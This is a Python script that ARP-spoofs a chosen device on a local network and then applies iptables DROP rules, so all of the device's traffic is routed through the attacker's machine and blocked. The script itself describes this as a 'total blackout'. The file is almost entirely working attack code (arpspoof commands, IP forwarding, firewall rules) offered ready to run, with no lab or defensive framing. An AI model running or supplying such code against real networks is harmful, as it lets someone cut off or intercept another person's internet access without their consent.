import os
import sys
import subprocess
import time

# Configuration
gateway_ip = "192.168.29.1"   # Router IP
target_ip = "192.168.29.224"  # Target device IP
interface = "eth0"            # Update to your actual interface (e.g., wlan0)

def enable_ip_forwarding():
    """Enable IP forwarding to allow traffic routing."""
    os.system("sysctl -w net.ipv4.ip_forward=1")
    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
        if f.read().strip() != "1":
            print("❌ Failed to enable IP forwarding. Exiting.")
            sys.exit(1)
    print("✅ IP Forwarding Enabled.")

def block_target():
    """Apply aggressive iptables rules to block all traffic."""
    print(f"🚫 Applying total blackout for {target_ip}...")
    
    # Block all incoming traffic from the target
    os.system(f"iptables -A INPUT -s {target_ip} -j DROP")
    # Block all outgoing traffic to the target
    os.system(f"iptables -A OUTPUT -d {target_ip} -j DROP")
    # Block all forwarded traffic from/to the target
    os.system(f"iptables -A FORWARD -s {target_ip} -j DROP")
    os.system(f"iptables -A FORWARD -d {target_ip} -j DROP")
    
    # Verify rules are applied
    result = subprocess.run("iptables -L -v -n", shell=True, capture_output=True, text=True)
    if target_ip in result.stdout:
        print("🔥 Total blackout enforced. Verify with 'iptables -L -v -n'.")
    else:
        print("❌ Failed to apply iptables rules. Exiting.")
        sys.exit(1)

def start_arpspoof():
    """Start bidirectional ARP spoofing to intercept all traffic."""
    print(f"⚡ Initiating peak-power ARP spoofing...")
    
    cmd1 = f"arpspoof -i {interface} -t {target_ip} {gateway_ip}"
    cmd2 = f"arpspoof -i {interface} -t {gateway_ip} {target_ip}"
    
    # Run ARP spoofing in background with error redirection
    proc1 = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    proc2 = subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Wait for spoofing to stabilize
    time.sleep(5)
    
    # Check if processes are running
    if proc1.poll() is None and proc2.poll() is None:
        print(f"✅ ARP spoofing locked in. Traffic rerouted through this machine.")
    else:
        err1 = proc1.stderr.read().decode() if proc1.stderr else "Unknown error"
        err2 = proc2.stderr.read().decode() if proc2.stderr else "Unknown error"
        print(f"❌ ARP spoofing failed. Errors: {err1} | {err2}")
        sys.exit(1)
    
    return proc1, proc2

def unblock_target():
    """Remove all iptables rules and restore access."""
    os.system("iptables -F INPUT")
    os.system("iptables -F OUTPUT")
    os.system("iptables -F FORWARD")
    print(f"✅ Total blackout lifted for {target_ip}.")

def verify_setup():
    """Optional: Verify traffic is intercepted (run tcpdump manually if needed)."""
    print("💡 Tip: Run 'tcpdump -i {interface} host {target_ip}' in another terminal to confirm traffic flow.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("⚠️ This script requires root privileges. Run with 'sudo'.")
        sys.exit(1)

    try:
        print("🔴 Initiating peak-power internet blackout...")
        enable_ip_forwarding()
        arp_proc1, arp_proc2 = start_arpspoof()
        block_target()
        verify_setup()

        print(f"🔥 {target_ip} is now in total blackout. Web services and all traffic blocked. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)  # Keep script running

    except KeyboardInterrupt:
        print("\n🛑 Terminating blackout...")
        arp_proc1.terminate()
        arp_proc2.terminate()
        unblock_target()
        print("✅ Internet access fully restored.")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        unblock_target()
        sys.exit(1)